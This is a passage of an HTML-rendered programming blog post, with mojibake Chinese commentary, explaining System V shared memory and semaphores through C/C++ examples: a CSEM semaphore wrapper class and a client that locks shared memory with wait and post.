class=\"line\">        shmptr[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    shmdt(shmptr);</span><br><span class=\"line\">    sleep(<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/10/18/shared-memory-and-semaphore-machenism/1.png\" alt=\"1\"></p>\n<h1 id=\"ä¿¡å·é‡\"><a class=\"markdownIt-Anchor\" href=\"#ä¿¡å·é‡\">#</a> ä¿¡å·é‡</h1>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">semget</span><span class=\"params\">(<span class=\"type\">key_t</span> key, <span class=\"type\">int</span> nsems, <span class=\"type\">int</span> semflg)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">semop</span><span class=\"params\">(<span class=\"type\">int</span> semid, <span class=\"keyword\">struct</span> sembuf *sops, <span class=\"type\">size_t</span> nsops)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">semctl</span><span class=\"params\">(<span class=\"type\">int</span> semid, <span class=\"type\">int</span> semnum, <span class=\"type\">int</span> cmd, ...)</span>;</span><br></pre></td></tr></table></figure>\n<pre><code>   The  semget()  system  call  returns the System V semaphore set identifier associated with the argument key.\n</code></pre>\n<p>åˆ›å»ºæ–¹æ³•ä¸¤ç§ ä¸€ç§ç”¨ key é‡Œçš„ <code>IPC_PRIVATE</code> ï¼Œä¸€ç§ç”¨ semflg é‡Œçš„ <code>IPC_CREAT</code> <br>\nnsems æ˜¯ä¿¡å·é‡ä¸ªæ•°ã€‚</p>\n<p>semop å°±æ˜¯ç­‰å¾…é”å’Œé‡Šæ”¾é”<br>\nåœ¨ semctl ä¸­ éœ€è¦ç”¨åˆ° <code>semun</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">semun</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span>              val;    <span class=\"comment\">/* Value for SETVAL */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">semid_ds</span> *<span class=\"title\">buf</span>;</span>    <span class=\"comment\">/* Buffer for IPC_STAT, IPC_SET */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">short</span>  *<span class=\"built_in\">array</span>;  <span class=\"comment\">/* Array for GETALL, SETALL */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">seminfo</span>  *__<span class=\"title\">buf</span>;</span>  <span class=\"comment\">/* Buffer for IPC_INFO</span></span><br><span class=\"line\"><span class=\"comment\">                                (Linux-specific) */</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>semop ä¸­ éœ€è¦ç”¨åˆ°</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sembuf</span>&#123;</span></span><br><span class=\"line\">         <span class=\"type\">unsigned</span> <span class=\"type\">short</span> sem_num;  <span class=\"comment\">/* semaphore number */</span></span><br><span class=\"line\">         <span class=\"type\">short</span>          sem_op;   <span class=\"comment\">/* semaphore operation */</span></span><br><span class=\"line\">         <span class=\"type\">short</span>          sem_flg;  <span class=\"comment\">/* operation flags */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p><strong>sem_op å‚æ•°</strong>ï¼š</p>\n<ul>\n<li>sem_op &gt; 0          ä¿¡å·åŠ ä¸Š sem_op çš„å€¼ï¼Œè¡¨ç¤ºè¿›ç¨‹é‡Šæ”¾æ§åˆ¶çš„èµ„æºï¼›</li>\n<li>sem_op = 0          å¦‚æœæ²¡æœ‰è®¾ç½® IPC_NOWAITï¼Œåˆ™è°ƒç”¨è¿›ç¨‹è¿›å…¥ç¡çœ çŠ¶æ€ï¼Œç›´åˆ°ä¿¡å·é‡çš„å€¼ä¸º 0ï¼›å¦åˆ™è¿›ç¨‹ä¸å›ç¡çœ ï¼Œç›´æ¥è¿”å› EAGAIN</li>\n<li>sem_op &lt; 0          ä¿¡å·åŠ ä¸Š sem_op çš„å€¼ã€‚è‹¥æ²¡æœ‰è®¾ç½® IPC_NOWAIT ï¼Œåˆ™è°ƒç”¨è¿›ç¨‹é˜»å¡ï¼Œç›´åˆ°èµ„æºå¯ç”¨ï¼›å¦åˆ™è¿›ç¨‹ç›´æ¥è¿”å› EAGAIN</li>\n</ul>\n</li>\n<li>\n<p><strong>sem_flg å‚æ•°</strong>ï¼š</p>\n<ul>\n<li>è¯¥å‚æ•°å¯è®¾ç½®ä¸º IPC_NOWAIT æˆ– SEM_UNDO ä¸¤ç§çŠ¶æ€ã€‚åªæœ‰å°† sem_flg æŒ‡å®šä¸º SEM_UNDO æ ‡å¿—åï¼Œsemadj ï¼ˆæ‰€æŒ‡å®šä¿¡å·é‡é’ˆå¯¹è°ƒç”¨è¿›ç¨‹çš„è°ƒæ•´å€¼ï¼‰æ‰ä¼šæ›´æ–°ã€‚   æ­¤å¤–ï¼Œå¦‚æœæ­¤æ“ä½œæŒ‡å®š SEM_UNDOï¼Œç³»ç»Ÿæ›´æ–°è¿‡ç¨‹ä¸­ä¼šæ’¤æ¶ˆæ­¤ä¿¡å·ç¯çš„è®¡æ•°ï¼ˆsemadjï¼‰ã€‚æ­¤æ“ä½œå¯ä»¥éšæ—¶è¿›è¡Œ â€” å®ƒæ°¸è¿œä¸ä¼šå¼ºåˆ¶ç­‰å¾…çš„è¿‡ç¨‹ã€‚è°ƒç”¨è¿›ç¨‹å¿…é¡»æœ‰æ”¹å˜ä¿¡å·é‡é›†çš„æƒé™ã€‚</li>\n</ul>\n</li>\n<li></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/ipc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/shm.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/sem.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ipc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/sem.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CSEM</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">private:</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">semun</span>  // ç”¨äºä¿¡å·ç¯æ“ä½œçš„å…±åŒä½“ã€‚</span></span><br><span class=\"line\"><span class=\"class\">  &#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> val;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">semid_ds</span> *<span class=\"title\">buf</span>;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">short</span> *arry;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"type\">int</span>  sem_id;  <span class=\"comment\">// ä¿¡å·ç¯æè¿°ç¬¦ã€‚</span></span><br><span class=\"line\">public:</span><br><span class=\"line\">  <span class=\"type\">bool</span> <span class=\"title function_\">init</span><span class=\"params\">(<span class=\"type\">key_t</span> key)</span>; <span class=\"comment\">// å¦‚æœä¿¡å·ç¯å·²å­˜åœ¨ï¼Œè·å–ä¿¡å·ç¯ï¼›å¦‚æœä¿¡å·ç¯ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¿¡å·ç¯å¹¶åˆå§‹åŒ–ã€‚</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> <span class=\"title function_\">wait</span><span class=\"params\">()</span>;          <span class=\"comment\">// ç­‰å¾…ä¿¡å·ç¯æŒ‚å‡ºã€‚</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> <span class=\"title function_\">post</span><span class=\"params\">()</span>;          <span class=\"comment\">// æŒ‚å‡ºä¿¡å·ç¯ã€‚</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> <span class=\"title function_\">destroy</span><span class=\"params\">()</span>;       <span class=\"comment\">// é”€æ¯ä¿¡å·ç¯ã€‚</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   CSEM sem;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"comment\">// ç”¨keyå€¼0x5000 åˆå§‹ä¿¡å·ç¯ã€‚</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (sem.init(<span class=\"number\">0x5000</span>)==<span class=\"literal\">false</span>) </span><br><span class=\"line\">    &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.init failed.\\n&quot;</span>); <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.init ok\\n&quot;</span>);</span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"comment\">// ç­‰å¾…ä¿¡ä¿¡å·æŒ‚å‡ºï¼Œç­‰å¾…æˆåŠŸåï¼Œå°†æŒæœ‰é”ã€‚</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (sem.wait() == <span class=\"literal\">false</span>) </span><br><span class=\"line\">    &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.wait failed.\\n&quot;</span>); <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.wait ok\\n&quot;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">   sleep(<span class=\"number\">10</span>);  <span class=\"comment\">// åœ¨sleepçš„è¿‡ç¨‹ä¸­ï¼Œè¿è¡Œå…¶å®ƒçš„book259ç¨‹åºå°†ç­‰å¾…é”ã€‚</span></span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"comment\">// æŒ‚å‡ºä¿¡å·ç¯ï¼Œé‡Šæ”¾é”ã€‚</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (sem.post() == <span class=\"literal\">false</span>) </span><br><span class=\"line\">    &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.post failed.\\n&quot;</span>); <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.post ok\\n&quot;</span>);</span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"comment\">// é”€æ¯ä¿¡å·ç¯ã€‚</span></span><br><span class=\"line\">   <span class=\"comment\">// if (sem.destroy()==false) &#123; printf(&quot;sem.destroy failed.\\n&quot;); return -1; &#125;</span></span><br><span class=\"line\">   <span class=\"comment\">// printf(&quot;sem.destroy ok\\n&quot;);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">CSEM::init</span><span class=\"params\">(<span class=\"type\">key_t</span> key)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">// è·å–ä¿¡å·ç¯ã€‚</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (sem_id=semget(key,<span class=\"number\">1</span>,<span class=\"number\">0640</span>)) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">// å¦‚æœä¿¡å·ç¯ä¸å­˜åœ¨ï¼Œåˆ›å»ºå®ƒã€‚</span></span><br><span class=\"line\">    <span class=\"comment\">// No semaphore set exists for key and semflg did not specify IPC_CREAT.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (errno == ENOENT) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (sem_id=semget(key,<span class=\"number\">1</span>,<span class=\"number\">0640</span>|IPC_CREAT)) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">        &#123; perror(<span class=\"string\">&quot;init 1 semget()&quot;</span>); <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">      <span class=\"comment\">// ä¿¡å·ç¯åˆ›å»ºæˆåŠŸåï¼Œè¿˜éœ€è¦æŠŠå®ƒåˆå§‹åŒ–æˆå¯ç”¨çš„çŠ¶æ€ã€‚</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">semun</span> <span class=\"title\">sem_union</span>;</span></span><br><span class=\"line\">      <span class=\"comment\">// å°±æ˜¯è®¾ç½®å€¼ä¸º1</span></span><br><span class=\"line\">      sem_union.val = <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (semctl(sem_id,<span class=\"number\">0</span>,SETVAL,sem_union) &lt;  <span class=\"number\">0</span>) </span><br><span class=\"line\">        &#123; perror(<span class=\"string\">&quot;init semctl()&quot;</span>); <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123; perror(<span class=\"string\">&quot;init 2 semget()&quot;</span>); <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">CSEM::destroy</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (semctl(sem_id,<span class=\"number\">0</span>,IPC_RMID) == <span class=\"number\">-1</span>) </span><br><span class=\"line\">    &#123; perror(<span class=\"string\">&quot;destroy semctl()&quot;</span>); <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">CSEM::wait</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sembuf</span> <span class=\"title\">sem_b</span>;</span></span><br><span class=\"line\">  sem_b.sem_num = <span class=\"number\">0</span>;</span><br><span class=\"line\">  sem_b.sem_op = <span class=\"number\">-1</span>;</span><br><span class=\"line\">  sem_b.sem_flg = SEM_UNDO;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (semop(sem_id, &amp;sem_b, <span class=\"number\">1</span>) == <span class=\"number\">-1</span>) &#123; perror(<span class=\"string\">&quot;wait semop()&quot;</span>); <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">CSEM::post</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sembuf</span> <span class=\"title\">sem_b</span>;</span></span><br><span class=\"line\">  sem_b.sem_num = <span class=\"number\">0</span>;</span><br><span class=\"line\">  sem_b.sem_op = <span class=\"number\">1</span>;  </span><br><span class=\"line\">  sem_b.sem_flg = SEM_UNDO;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (semop(sem_id, &amp;sem_b, <span class=\"number\">1</span>) == <span class=\"number\">-1</span>) &#123; perror(<span class=\"string\">&quot;post semop()&quot;</span>); <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™ä¸ªä»£ç æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œåœ¨ semop ä¸º - 1 è¿™é‡Œ<br>\nç­‰å¾…ä¸€ä¸ªå…¶ä»–è¿›ç¨‹æ‰§è¡Œ <code>(semop(sem_id, &amp;sem_b, 1)</code>  ï¼Œå…¶ä¸­ <code>sem_b.sem_op = 1</code> , ä¹Ÿå°±æ˜¯é‡Šæ”¾ä¸€ä¸ªèµ„æº.<br>\n è€Œæœ€åˆçš„èµ„æºæ•°é‡æ˜¯ <code>SETVAL</code>  æ‰€åˆ›å»ºçš„</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">CSEM::wait</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sembuf</span> <span class=\"title\">sem_b</span>;</span></span><br><span class=\"line\">  sem_b.sem_num = <span class=\"number\">0</span>;</span><br><span class=\"line\">  sem_b.sem_op = <span class=\"number\">-1</span>;</span><br><span class=\"line\">  sem_b.sem_flg = SEM_UNDO;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (semop(sem_id, &amp;sem_b, <span class=\"number\">1</span>) == <span class=\"number\">-1</span>) &#123; perror(<span class=\"string\">&quot;wait semop()&quot;</span>); <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"ä¿¡å·é‡å¯¹å…±äº«å†…å­˜åŠ é”\"><a class=\"markdownIt-Anchor\" href=\"#ä¿¡å·é‡å¯¹å…±äº«å†…å­˜åŠ é”\">#</a> ä¿¡å·é‡å¯¹å…±äº«å†…å­˜åŠ é”</h1>\n<p>å°±æ˜¯åœ¨å…±äº«å†…å­˜æ“ä½œä¹‹ä¸­ä½¿ç”¨ä¸Šæ–‡æåˆ°çš„ wait å’Œ postï¼Œè¿™å…¶å®å°±æ˜¯ä¸ª P-V æ“ä½œï¼Œæè¿™ä¹ˆç¥ç¥å¨å¨çš„ã€‚<br>\nç„¶åè¿™ PV ä¹‹é—´æ‰å¯¹å…±äº«å†…å­˜æ“ä½œ.<br>\n éƒ¨åˆ†ä»£ç å†ä¸Šæ–‡ã€‚<br>\nclient.cpp</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> *shmptr = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">shm_register</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> shmid = <span class=\"built_in\">shmget</span>( (<span class=\"type\">key_t</span>)<span class=\"number\">0x5005</span>, <span class=\"number\">1024</span>, <span class=\"number\">0640</span>|IPC_CREAT);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( shmid == <span class=\"number\">-1</span> )</span><br><span class=\"line\">      &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;shmget() failed\\n&quot;</span>);  <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">    shmptr = (<span class=\"type\">char</span> *)<span class=\"built_in\">shmat</span>(shmid, <span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> shmid;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   CSEM sem;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"comment\">// ç”¨keyå€¼0x5000 åˆå§‹ä¿¡å·ç¯ã€‚</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (sem.<span class=\"built_in\">init</span>(<span class=\"number\">0x5000</span>)==<span class=\"literal\">false</span>) </span><br><span class=\"line\">    &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.init failed.\\n&quot;</span>); <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.init ok\\n&quot;</span>);</span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"comment\">// ç­‰å¾…ä¿¡ä¿¡å·æŒ‚å‡ºï¼Œç­‰å¾…æˆåŠŸåï¼Œå°†æŒæœ‰é”ã€‚</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (sem.<span class=\"built_in\">wait</span>() == <span class=\"literal\">false</span>) </span><br><span class=\"line\">    &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.wait failed.\\n&quot;</span>); <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.wait ok\\n&quot;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"comment\">// ç”³è¯·ä¸€ä¸ªå…±äº«å†…å­˜å¹¶å°†shmptræŒ‡è¿‡å»</span></span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Proc1 write 0x10 A to shm&quot;</span>);</span><br><span class=\"line\">   <span class=\"type\">int</span> shmid = <span class=\"built_in\">shm_register</span>();</span><br><span class=\"line\">   <span class=\"built_in\">memset</span>(shmptr, <span class=\"string\">&#x27;A&#x27;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">   <span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"comment\">// æŒ‚å‡ºä¿¡å·ç¯ï¼Œé‡Šæ”¾é”ã€‚</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (sem.<span class=\"built_in\">post</span>() == <span class=\"literal\">false</span>) </span><br><span class=\"line\">    &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.post failed.\\n&quot;</span>); <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; &#125;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sem.post 